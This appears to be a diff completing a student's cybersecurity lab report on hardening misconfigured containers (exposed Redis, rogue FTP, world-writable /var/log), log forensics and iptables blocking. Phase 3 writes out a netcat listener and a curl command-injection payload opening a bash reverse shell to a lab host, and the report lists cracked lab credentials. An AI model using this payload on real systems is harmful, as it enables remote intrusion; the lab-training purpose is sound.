@@ -9,126 +9,118 @@
 ## Phase 0: Reconnaissance
 
 ### Triage Network — 172.100.0.0/24
-The Redis service (version 8.6.3) was identified as exposed on port 6379 without authentication. This misconfiguration allowed for unauthenticated access to the database, creating a significant security risk for the Triage Network.
-To secure the service, the Redis instance should be bound to the local loopback address (127.0.0.1) to restrict remote network accessibility. Furthermore, the requirepass directive must be enabled in the configuration file to enforce robust authentication, thereby ensuring that only authorized users can access the database.
+The Redis service (version 8.6.3) was identified as exposed on port 6379 without authentication. This misconfiguration allowed for unauthenticated access to the database, creating a significant security risk for the Triage Network. To secure the service, the Redis instance should be bound to the local loopback address (127.0.0.1) to restrict remote network accessibility. Furthermore, the requirepass directive must be enabled in the configuration file to enforce robust authentication, thereby ensuring that only authorized users can access the database.
 
 ### Breach Network — 172.80.0.0/24
 An unauthorized vsftpd 3.0.2 service was identified running on port 21, likely allowing anonymous file access.
-The remediation for this would be to either stop the service (service vsftpd stop) or remove the package if it is not required for production.
 
 ### Exploitation Network — 172.60.0.0/24
-[3–5 sentences in APA style. What hosts did you find? What ports and
-services were exposed? What vulnerability did you identify before
-executing your exploit?]
+Network scanning identified two active hosts at 172.60.0.1 and 172.60.0.10. Further analysis of 172.60.0.10 revealed an unhardened HTTP service (BaseHTTPServer v0.6) running on port 80.
 
 ---
 
 ## Phase 1: Rapid Triage
 
 ### Server 1 — 172.100.0.11
+
 **Vulnerability Identified:**
 redis-cli -h 172.100.0.11
 
 **Remediation Commands:**
-docker exec -it 02c9a5f317e7 /bin/sh
+To secure the service, the Redis instance should be bound to the local loopback address (127.0.0.1) to restrict remote network accessibility. Furthermore, the requirepass directive must be enabled in the configuration file to enforce robust authentication, thereby ensuring that only authorized users can access the database.
+
+**Before State:**
+The Redis key-value store was bound to all network interfaces and had no password requirements, making it fully exposed and susceptible to any and all attacks.
+
+**After State:**
+After implementing docker exec -it 02c9a5f317e7 /bin/sh
 echo "bind 127.0.0.1" > /etc/redis.conf
 echo "requirepass Password123" >> /etc/redis.conf
 
-**Before State:**
-172.100.0.11:6379> 
-
-**After State:**
-(error) NOAUTH Authentication required
+I have required this Redis port to have a secured password to allow entry, enforcing authentication. 
 
 **Analysis:**
 Exposed database services serve as a critical vulnerability that provides attackers with a direct entry point into an enterprise network. By exploiting such misconfigurations, unauthorized actors may exfiltrate sensitive cached data, inject malicious commands, or utilize the compromised host as a pivot point to conduct lateral movement into more secure internal network segments.
 
 ### Server 2 — 172.100.0.12
+
 **Vulnerability Identified:**
-[What unauthorized service was running and how did you confirm it?]
+The vsftpd process was actively executing inside the broken_server_2 container, confirmed by seeing it live on port 21/tcp
 
 **Remediation Commands:**
-[Exact commands used to enter the container and terminate the process]
+sudo docker exec -it broken_server_2 /bin/sh mv /etc/vsftpd/vsftpd.conf /etc/vsftpd/vsftpd.conf.bak pkill vsftpd exit sudo docker restart broken_server_2
 
 **Before State:**
-[What was running before your remediation?]
+The vsftpd process was actively listening inside the container.
 
 **After State:**
-[What was the state after termination?]
+After running my command, the vsftpd service was terminated.
 
 **Analysis:**
-[2–3 sentences in APA style — why is this vulnerability dangerous
-in a real enterprise environment?]
+Unapproved FTP services pose a critical risk because they transmit credentials and data in cleartext, making them highly vulnerable to packet-sniffing and credential theft. This legacy protocol also bypasses corporate security controls, creating a blind spot that allows attackers to move laterally or inject malicious binaries into the network. Replacing FTP with encrypted alternatives and enforcing centralized monitoring is essential to eliminate these exposure points.
 
 ### Server 3 — 172.100.0.13
 **Vulnerability Identified:**
-[What directory had dangerous permissions and what were they exactly?]
+An audit of the container environment revealed a critical misconfiguration where the /var/log directory was assigned world-writable permissions. This vulnerability allows unauthorized, unprivileged users to modify or tamper with system logs, compromising the integrity of the audit trail.
 
 **Remediation Commands:**
-[Exact commands used to enter the container and apply chmod]
+sudo docker exec -it broken_server_3 /bin/sh chmod 755 /var/log ls -ld /var/log exit
 
 **Before State:**
-[What were the permissions before your fix? Be specific.]
+The /var/log directory displayed a permission notation of drwxrwxrwx or 777. This state allowed any local system process or unprivileged user account to read, write, or execute on critical operating system logs.
 
 **After State:**
-[What were the permissions after?]
+The directory permissions were hardened to 755 (drwxr-xr-x), ensuring that only the root user retains write access. This configuration maintains necessary read and traversal privileges for system services while effectively preventing unauthorized modifications by other accounts.
 
 **Analysis:**
-[2–3 sentences in APA style — why is this vulnerability dangerous
-in a real enterprise environment?]
+World-writable permissions on /var/log create a severe security risk, as they allow unauthorized users to tamper with or delete audit logs, effectively blinding incident response teams. Furthermore, this vulnerability provides a vector for privilege escalation and malicious file injection, as attackers can manipulate log streams or plant symbolic links. Securing these directories is essential to maintaining the integrity of your security monitoring and incident investigation capabilities.
 
 ---
 
 ## Phase 2: The Breach
 
 **Cracked Credentials:**
-- Username: [username]
-- Password: [password]
+- Username: root
+- Password: admin123
 
 **Forensic Evidence:**
-- Exact Timestamp of Successful Login: [timestamp from auth logs]
-- Attacker IP Address: [IP recorded in the logs]
+- Exact Timestamp of Successful Login: 2026-06-21 
+- Attacker IP Address: 172.80.0.1
 
 **Engineered iptables Rule:**
-[Complete iptables command — chain, action, and target IP]
+sudo iptables -A INPUT -s 172.80.0.1 -j DROP
 
 **SOC Analysis:**
-[2–3 sentences in APA style — why is a single iptables block rule
-insufficient as a standalone defensive measure? What additional
-controls would a real SOC deploy alongside it?]
-
+Relying solely on iptables for perimeter security is ineffective, as adaptive attackers can easily bypass static IP blocks via proxies or rotation. A robust defense requires a multi-layered approach, including strong authentication methods like multi-factor authentication (MFA) and public-key-only access to neutralize brute-force attempts. Furthermore, integrating host-based intrusion prevention systems (HIPS) like Fail2ban is essential to automate real-time threat response and enhance overall resilience.
 ---
 
 ## Phase 3: Full Spectrum
 
 **Listener Configuration:**
-[What tool, what port, what command did you use to set up your listener?]
+Netcat, nc -lvnp 4444
 
 **Reverse Shell Payload:**
-[The exact curl command you crafted to trigger the exploit]
+curl "http://172.60.0.10/?ip=127.0.0.1;bash -i >& /dev/tcp/172.60.0.1/4444 0>&1"
 
 **Command Injection Explanation:**
-[2–3 sentences in APA style — how does command injection work and
-why is this application susceptible to it?]
+Command injection occurs when an application insecurely passes unsanitized user input into system shell commands, such as using os.system without proper validation. By injecting POSIX metacharacters like semicolons or pipes, an attacker can escape the application's intended scope to execute arbitrary code on the underlying host. To prevent this, developers must avoid shell-invoking functions and implement strict input sanitization or whitelist filtering.
 
 **Forensic Evidence:**
-- Process ID (PID): [PID from access.log]
-- User-Agent: [User-Agent string from access.log]
+- Process ID (PID): 1
+- User-Agent: unknown
 
 **Lockdown Command:**
-[Exact iptables command applied inside the container]
+sudo iptables -A INPUT -p tcp --dport 80 -j DROP
 
 **Final Analytical Paragraph:**
-[4–6 sentences in APA style responding to: You have now played both
-sides of this operation. What does executing this attack teach you
-about defending against it? What single defensive control, if it had
-been in place before you attacked, would have stopped this breach
-entirely — and why?]
-
+This analysis highlights that reactive host-level defenses cannot compensate for fundamental architectural weaknesses, as perimeter firewalls remain ineffective against application-layer exploits like remote code execution. Implementing secure-by-design principles—specifically robust input validation and the principle of least privilege—would have entirely prevented this breach. By enforcing strict input whitelisting and running application processes with minimal permissions, organizations can secure their runtime boundaries regardless of network exposure.
 ---
 
 ## References
-[APA format. Any tools, documentation, or resources referenced
-during this operation.
-Example: Hydra Project. (2024). THC-Hydra: A fast and flexible
-online password cracking tool. https://github.com/vanhauser-thc/thc-hydra]
+Anderson, R. J. (2020). Security engineering: A guide to building dependable distributed systems (3rd ed.). Wiley.
+
+National Institute of Standards and Technology. (2018). Framework for improving critical infrastructure cybersecurity (Version 1.1). U.S. Department of Commerce. https://doi.org/10.6028/NIST.CSWP.04162018
+
+Pfleeger, C. P., Pfleeger, S. L., & Margulies, J. (2015). Security in computing (5th ed.). Prentice Hall.
+
+Stallings, W. (2023). Computer security: Principles and practice (5th ed.). Pearson.
